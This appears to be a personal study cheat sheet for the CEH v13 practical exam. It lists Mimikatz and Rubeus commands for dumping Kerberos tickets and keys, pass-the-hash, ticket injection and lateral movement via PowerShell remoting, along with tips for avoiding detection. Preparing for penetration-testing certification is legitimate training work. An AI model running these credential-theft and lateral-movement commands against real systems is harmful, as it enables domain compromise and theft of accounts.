# CEH v13 Cheat Sheet

Cheat sheet for CEH v13 Pratical Exam on May 15th, 2026

## Pass the Ticket (PtT) Cheat Sheet

### 1. Export Tickets

Mimikatz:
```
privilege::debug
sekurlsa::tickets /export        # exports .kirbi files
sekurlsa::ekeys                  # dump AES/RC4 keys
```
Rubeus:
```
Rubeus.exe dump /nowrap          # dump all tickets as Base64
```

### 2. OverPass the Hash (Pass the Key)

Mimikatz (RC4):
```
sekurlsa::pth /domain:domain.htb /user:username /ntlm:<hash>
```
Rubeus (AES256 — preferred, less detectable):
```
Rubeus.exe asktgt /domain:domain.htb /user:username /aes256:<hash> /nowrap
```

### 3. Pass the Ticket

Rubeus — request TGT and inject immediately:
```
Rubeus.exe asktgt /domain:domain.htb /user:username /rc4:<hash> /ptt
```
Rubeus — inject existing ticket:
```
Rubeus.exe ptt /ticket:<base64>
Rubeus.exe ptt /ticket:ticket.kirbi
```
Mimikatz — inject .kirbi:
```
kerberos::ptt "C:\path\to\ticket.kirbi"
```
Convert .kirbi to Base64 (PowerShell):
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

### 4. Lateral Movement via PowerShell Remoting

Mimikatz path:
```
# 1. Import ticket in mimikatz
kerberos::ptt "ticket.kirbi"
# 2. Exit mimikatz, launch PowerShell from same cmd window
powershell
Enter-PSSession -ComputerName DC01
```
Rubeus path:
```
# 1. Create sacrificial process
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# 2. In new window, request TGT and inject
Rubeus.exe asktgt /user:username /domain:domain.htb /aes256:<hash> /ptt
# 3. Launch PowerShell
powershell
Enter-PSSession -ComputerName DC01
```

### Key Notes
| Item | Detail |
|------|--------|
| TGT | Used to request access to any resource |
| TGS | Used for a specific service only |
| `.kirbi` ending in `$` | Computer account ticket |
| `krbtgt` ticket | That user's TGT |
| RC4 vs AES256 | AES256 preferred — RC4 triggers encryption downgrade alert |
| Mimikatz PtT | Requires admin rights |
| Rubeus PtT | Does not require admin rights |
| Ports | TCP 5985 (HTTP) / 5986 (HTTPS) for WinRM/PSRemoting |


